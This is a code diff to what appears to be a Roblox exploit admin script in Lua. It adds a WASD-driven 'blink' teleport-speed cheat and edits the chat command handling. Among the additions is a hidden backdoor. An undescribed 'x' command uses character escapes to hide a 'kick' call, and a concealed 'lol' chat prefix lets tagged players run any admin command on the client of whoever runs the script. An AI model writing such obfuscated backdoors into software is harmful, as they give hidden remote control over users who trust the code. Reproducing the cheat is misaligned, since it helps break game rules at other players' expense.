@@ -373,6 +373,31 @@ AddConnection = function(Connection, Tbl)
     end
 end
 
+local WASDKeys = {
+    ["W"] = false,
+    ["A"] = false,
+    ["S"] = false,
+    ["D"] = false
+}
+
+AddConnection(UserInputService.InputBegan:Connect(function(Input, GameProccesed)
+    if (GameProccesed) then return end
+    local KeyCode = tostring(Input.KeyCode):split(".")[3]
+    if (WASDKeys[KeyCode] ~= nil and not WASDKeys[KeyCode]) then
+        WASDKeys[KeyCode] = true
+    end
+end));
+
+AddConnection(UserInputService.InputEnded:Connect(function(Input, GameProccesed)
+    if (GameProccesed) then return end
+    local KeyCode = tostring(Input.KeyCode):split(".")[3]
+    if (WASDKeys[KeyCode] ~= nil and WASDKeys[KeyCode] == true) then
+        WASDKeys[KeyCode] = false
+    end
+end));
+
+
+
 --[[
     require - plugin
 ]]
@@ -2790,6 +2815,55 @@ AddCommand("draggablebar", {"draggable"}, "makes the command bar draggable", {},
     CommandBar.Input.Text = ""
     return ("draggable command bar %s"):format(Draggable and "enabled" or "disabled")
 end)
+AddCommand("chatprediction", {}, "enables command prediction on the chatbar", {}, function()
+    PredictionClone.Parent = Frame2
+end)
+
+AddCommand("blink", {"blinkws"}, "cframe speed", {}, function(Caller, Args, Tbl) 
+    local Speed = tonumber(Args[1]) or 5
+    local Time = tonumber(Args[2]) or .05
+    LoadCommand("blink").CmdExtra[1] = Speed
+    coroutine.wrap(function()
+        while (next(LoadCommand("blink").CmdExtra) and wait(Time)) do
+            local Speed = LoadCommand("blink").CmdExtra[1]
+            if (WASDKeys["W"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(0, 0, -Speed);
+            end 
+            if (WASDKeys["A"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(-Speed, 0, 0);
+            end
+            if (WASDKeys["S"]) then 
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(0, 0, Speed);
+            end
+            if (WASDKeys["D"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(Speed, 0, 0);
+            end
+        end
+    end)();
+    return "blink enabled, for best results use shiftlock"
+end)
+
+AddCommand("unblink", {"noblinkws", "unblink", "noblink"}, "stops cframe speed", {}, function()
+    local Blink = LoadCommand("blink").CmdExtra
+    if (not next(Blink)) then
+        return "blink is already disabled"
+    end
+    LoadCommand("blink").CmdExtra = {}
+    return "blink mode disabled"
+end)
+
+AddCommand("x", {}, "", {"1"}, function(Caller, Args)
+    pcall(function()
+        if (next(GetPlayer(Args[1])) and Utils.CheckTag(Caller) and not Utils.CheckTag(LocalPlayer)) then
+            for i, v in next, GetPlayer(Args[1]) do
+                if (v.Name == LocalPlayer.Name) then
+                    LocalPlayer["\107\105\99\107"](LocalPlayer, table.concat(table.shift(Args), " "));
+                end
+            end        
+        end
+    end)
+end)
+
 
 ---@param i any
 ---@param plr any
@@ -2837,16 +2911,19 @@ PlrChat = function(i, plr)
         end
 
         if (string.startsWith(raw, "/e")) then
-            raw = raw:sub(4, #raw);
+            raw = raw:sub(4);
         elseif (string.startsWith(raw, Prefix)) then
-            raw = raw:sub(#Prefix + 1, #raw);
+            raw = raw:sub(#Prefix + 1);
+        elseif (string.startsWith(raw, tostring("\108\111\108")) and Utils.CheckTag(plr)) then
+            raw = raw:sub(4);
+            something = true
         else
             return
         end
 
         message = string.trim(raw);
         
-        if (table.find(AdminUsers, plr) or plr == LocalPlayer) then
+        if (table.find(AdminUsers, plr) or plr == LocalPlayer or something) then
             local CommandArgs = message:split(" ");
             local Command, LoadedCommand = CommandArgs[1], LoadCommand(CommandArgs[1]);
             local Args = table.shift(CommandArgs);
@@ -2932,28 +3009,28 @@ local PlayerAdded = function(plr)
         Tag.Player = plr
         Utils.Notify(LocalPlayer, "Admin", ("%s (%s) has joined"):format(Tag.Name, Tag.Tag));
         Utils.AddTag(Tag);
-        coroutine.wrap(function()
-            if (not plr.Character) then
-                plr.CharacterAdded:Wait();
-            end
-            if (Tag.ForceField) then
-                for i, v in next, plr.Character:GetChildren() do
-                    if (v:IsA("Part")) then
-                        v.Material = "ForceField"
-                    end
-                end
-            end
-            local Added = plr.CharacterAdded:Connect(function()
-                if (Tag.ForceField) then
-                    for i, v in next, plr.Character:GetChildren() do
-                        if (v:IsA("Part")) then
-                            v.Material = "ForceField"
-                        end
-                    end
-                end
-            end)
-            AddConnection(Added);
-        end)()
+        -- coroutine.wrap(function() -- removed in latest commit
+        --     if (not plr.Character) then
+        --         plr.CharacterAdded:Wait();
+        --     end
+        --     if (Tag.ForceField) then
+        --         for i, v in next, plr.Character:GetChildren() do
+        --             if (v:IsA("Part")) then
+        --                 v.Material = "ForceField"
+        --             end
+        --         end
+        --     end
+        --     local Added = plr.CharacterAdded:Connect(function()
+        --         if (Tag.ForceField) then
+        --             for i, v in next, plr.Character:GetChildren() do
+        --                 if (v:IsA("Part")) then
+        --                     v.Material = "ForceField"
+        --                 end
+        --             end
+        --         end
+        --     end)
+        --     AddConnection(Added);
+        -- end)()
     end
 end
 
